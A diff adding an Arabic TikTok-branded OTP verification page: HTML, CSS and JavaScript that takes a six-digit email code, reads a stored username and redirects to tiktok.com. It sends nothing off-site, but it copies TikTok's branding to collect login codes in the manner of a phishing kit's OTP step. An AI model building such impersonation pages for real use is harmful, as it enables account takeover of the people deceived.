@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهوية - إدخال رمز OTP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #ff7e5f, #feb47b);
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .logo-container {
+            margin: 0 auto 20px;
+            width: 120px;
+            height: 120px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            max-width: 80%;
+            max-height: 80%;
+            border-radius: 50%;
+            object-fit: contain;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .instruction {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #555;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+        
+        .email-display {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .email-display .label {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 5px;
+        }
+        
+        .email-display .email {
+            font-weight: bold;
+            color: #495057;
+            direction: ltr;
+            font-size: 16px;
+            word-break: break-all;
+        }
+        
+        .otp-form {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            direction: ltr;
+            margin-bottom: 10px;
+        }
+        
+        .otp-digit {
+            width: 55px;
+            height: 60px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: all 0.3s;
+            outline: none;
+        }
+        
+        .otp-digit:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+        
+        .otp-digit.filled {
+            border-color: #764ba2;
+        }
+        
+        .timer {
+            text-align: center;
+            color: #ff7e5f;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        
+        .timer i {
+            margin-left: 5px;
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-secondary {
+            background-color: #f5f5f5;
+            color: #555;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e9e9e9;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #777;
+            font-size: 14px;
+        }
+        
+        .resend-link {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        
+        .resend-link.disabled {
+            color: #aaa;
+            pointer-events: none;
+        }
+        
+        .email-icon {
+            color: #667eea;
+            margin-left: 8px;
+        }
+        
+        .redirect-message {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f0f8ff;
+            border-radius: 10px;
+            border: 1px solid #d1e7ff;
+            display: none;
+        }
+        
+        .redirect-message.show {
+            display: block;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .tiktok-icon {
+            color: #000000;
+            margin: 0 5px;
+        }
+        
+        .redirect-countdown {
+            font-weight: bold;
+            color: #ff7e5f;
+            font-size: 18px;
+            margin: 0 5px;
+        }
+        
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                max-width: 95%;
+            }
+            
+            .otp-digit {
+                width: 45px;
+                height: 50px;
+                font-size: 24px;
+            }
+            
+            .content {
+                padding: 25px 20px;
+            }
+            
+            .buttons {
+                flex-direction: column;
+            }
+            
+            .email-display .email {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://p16-tiktokcdn-com.akamaized.net/obj/tiktok-obj/36156678f565aacb0be2eb32189ab411.png" alt="شعار TikTok" class="logo">
+            </div>
+            <h1>التحقق من هوية TikTok</h1>
+            <p>أدخل رمز التحقق المرسل إلى بريدك الإلكتروني</p>
+        </div>
+        
+        <div class="content">
+            <div class="instruction">
+                لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى بريدك الإلكتروني المسجل. يرجى إدخال الرمز أدناه للتحقق من هويتك والوصول إلى حساب TikTok الخاص بك.
+            </div>
+            
+            <div class="email-display">
+                <div class="label">
+                    <i class="fas fa-envelope email-icon"></i> تم الإرسال إلى:
+                </div>
+                <div class="email" id="emailDisplay">user@example.com</div>
+            </div>
+            
+            <form class="otp-form" id="otpForm">
+                <div class="otp-inputs">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="1" inputmode="numeric">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="2" inputmode="numeric">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="3" inputmode="numeric">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="4" inputmode="numeric">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="5" inputmode="numeric">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="6" inputmode="numeric">
+                </div>
+                
+                <div class="timer" id="timer">
+                    <i class="far fa-clock"></i> <span id="time">02:00</span>
+                </div>
+                
+                <div class="buttons">
+                    <button type="submit" class="btn btn-primary" id="submitBtn">
+                        <i class="fas fa-check-circle"></i> تأكيد الرمز والانتقال إلى TikTok
+                    </button>
+                    <button type="button" class="btn btn-secondary" id="resendBtn">
+                        <i class="fas fa-redo-alt"></i> إعادة الإرسال
+                    </button>
+                </div>
+            </form>
+            
+            <div class="redirect-message" id="redirectMessage">
+                <p><i class="fas fa-check-circle" style="color: #4CAF50; margin-left: 5px;"></i> <strong>تم التحقق بنجاح!</strong></p>
+                <p>سيتم توجيهك إلى منصة TikTok خلال <span class="redirect-countdown" id="redirectCountdown">5</span> ثوانٍ...</p>
+                <p><i class="fab fa-tiktok tiktok-icon"></i> يتم الآن إعداد حسابك على TikTok</p>
+            </div>
+            
+            <div class="footer">
+                لم تستلم الرمز؟ تحقق من مجلد البريد المزعج (Spam) أو 
+                <a class="resend-link disabled" id="resendLink">إعادة إرسال الرمز بعد <span id="resendTime">120</span> ثانية</a>
+            </div>
+            
+            <a href="index.html" class="back-link">العودة إلى صفحة تسجيل الدخول</a>
+        </div>
+    </div>
+
+    <script>
+        const otpDigits = document.querySelectorAll('.otp-digit');
+        const otpForm = document.getElementById('otpForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const resendLink = document.getElementById('resendLink');
+        const timerElement = document.getElementById('time');
+        const resendTimeElement = document.getElementById('resendTime');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const redirectMessage = document.getElementById('redirectMessage');
+        const redirectCountdown = document.getElementById('redirectCountdown');
+        
+        const sampleEmails = [
+            "user123@example.com",
+            "ahmed.mohamed@domain.com",
+            "sara.ali@company.org",
+            "client.service@business.net"
+        ];
+        
+        const savedUsername = localStorage.getItem('tiktok_username');
+        if (savedUsername) {
+            emailDisplay.textContent = savedUsername;
+        } else {
+            const randomEmail = sampleEmails[Math.floor(Math.random() * sampleEmails.length)];
+            emailDisplay.textContent = randomEmail;
+        }
+        
+        otpDigits.forEach((digit, index) => {
+            digit.addEventListener('input', (e) => {
+                if (isNaN(e.target.value)) {
+                    e.target.value = '';
+                    return;
+                }
+                
+                if (e.target.value !== '') {
+                    e.target.classList.add('filled');
+                    
+                    if (index < otpDigits.length - 1) {
+                        otpDigits[index + 1].focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
+                }
+                
+                checkOTPComplete();
+            });
+            
+            digit.addEventListener('keydown', (e) => {
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    otpDigits[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < otpDigits.length - 1) {
+                    otpDigits[index + 1].focus();
+                } else if (e.key === 'Backspace') {
+                    if (e.target.value === '' && index > 0) {
+                        otpDigits[index - 1].focus();
+                        otpDigits[index - 1].value = '';
+                        otpDigits[index - 1].classList.remove('filled');
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                }
+            });
+        });
+        
+        function checkOTPComplete() {
+            let otpComplete = true;
+            let otpValue = '';
+            
+            otpDigits.forEach(digit => {
+                if (digit.value === '') {
+                    otpComplete = false;
+                } else {
+                    otpValue += digit.value;
+                }
+            });
+            
+            submitBtn.disabled = !otpComplete;
+            
+            return otpComplete;
+        }
+        
+        let timeLeft = 120;
+        let timerInterval;
+        
+        function startTimer() {
+            clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                resendTimeElement.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendLink.classList.remove('disabled');
+                    resendLink.textContent = "إعادة إرسال الرمز الآن";
+                }
+            }, 1000);
+        }
+        
+        startTimer();
+        
+        resendBtn.addEventListener('click', function() {
+            if (timeLeft > 0) {
+                alert(`يرجى الانتظار ${timeLeft} ثانية قبل إعادة الإرسال`);
+                return;
+            }
+            
+            timeLeft = 120;
+            startTimer();
+            
+            resendLink.classList.add('disabled');
+            resendLink.innerHTML = 'إعادة إرسال الرمز بعد <span id="resendTime">120</span> ثانية';
+            
+            otpDigits.forEach(digit => {
+                digit.value = '';
+                digit.classList.remove('filled');
+            });
+            
+            submitBtn.disabled = true;
+            
+            const newRandomEmail = sampleEmails[Math.floor(Math.random() * sampleEmails.length)];
+            emailDisplay.textContent = newRandomEmail;
+            
+            otpDigits[0].focus();
+            
+            alert(`تم إرسال رمز التحقق الجديد بنجاح إلى ${newRandomEmail}!`);
+        });
+        
+        resendLink.addEventListener('click', function() {
+            if (!this.classList.contains('disabled')) {
+                resendBtn.click();
+            }
+        });
+        
+        function redirectToTikTok() {
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+            submitBtn.disabled = true;
+            
+            otpForm.style.display = 'none';
+            redirectMessage.classList.add('show');
+            
+            let countdown = 5;
+            redirectCountdown.textContent = countdown;
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                redirectCountdown.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    
+                    window.location.href = "https://www.tiktok.com";
+                }
+            }, 1000);
+        }
+        
+        otpForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!checkOTPComplete()) {
+                alert("يرجى إدخال رمز التحقق بالكامل");
+                return;
+            }
+            
+            let otpCode = '';
+            otpDigits.forEach(digit => {
+                otpCode += digit.value;
+            });
+            
+            if (otpCode.length !== 6 || isNaN(otpCode)) {
+                alert("الرجاء إدخال رمز تحقق صحيح مكون من 6 أرقام");
+                return;
+            }
+            
+            alert(`تم التحقق بنجاح!\nرمز التحقق المدخل: ${otpCode}\nالبريد الإلكتروني: ${emailDisplay.textContent}`);
+            
+            redirectToTikTok();
+        });
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            otpDigits[0].focus();
+        });
+    </script>
+</body>
+</html>
